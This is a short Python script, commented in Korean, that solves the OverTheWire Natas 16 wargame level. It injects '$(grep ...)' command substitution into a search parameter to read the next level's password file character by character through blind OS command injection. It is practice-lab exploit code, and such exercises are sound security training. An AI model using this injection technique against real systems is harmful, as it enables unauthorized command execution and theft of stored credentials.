import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
# 나타스 비밀번호 직접 대입
natas16_cred = ""

s = requests.Session()
s.auth = ("natas16", natas16_cred)
search_word = "abates"

# 해당 blind 및 OS command injection을 익스플로잇 하는 함수
def blind_os_command_inject(search_word):
  # 비밀번호가 영어 대소문자, 숫자인거 아니까 아래처럼 구성 
  char_set = string.ascii_letters + string.digits
  password = ""
  
  # natas의 비밀번호 길이는 32자로 정해져있어서 32번 반복
  for i in range(1, 33):
    # 하나하나 비교하면서 출력(blind_sqli와 동일하게 반복)
    for ch in char_set:
      payload = f"$(grep ^{password + ch} /etc/natas_webpass/natas17){search_word}"
      parms = {"needle":payload, "submit": "Search"}
      
      response = s.get(url, params=parms)
      
      # 각자 시행마다 진행 상황 출력 및 아래 조건에 맞는 password추가 
      if search_word not in response.text:
        password += ch
        print(f"{i}번째 자리 문자:{password}") 
        break 
  
  return password

# 함수를 통해 blind os command injection 시행 후, 결과값 저장 
next_level_password = blind_os_command_inject(search_word)

# 비밀번호값 출력
print("="* 60)
print(f"[+]검색된 natas17의 비밀번호: ==> {next_level_password}")    
print("="* 60)

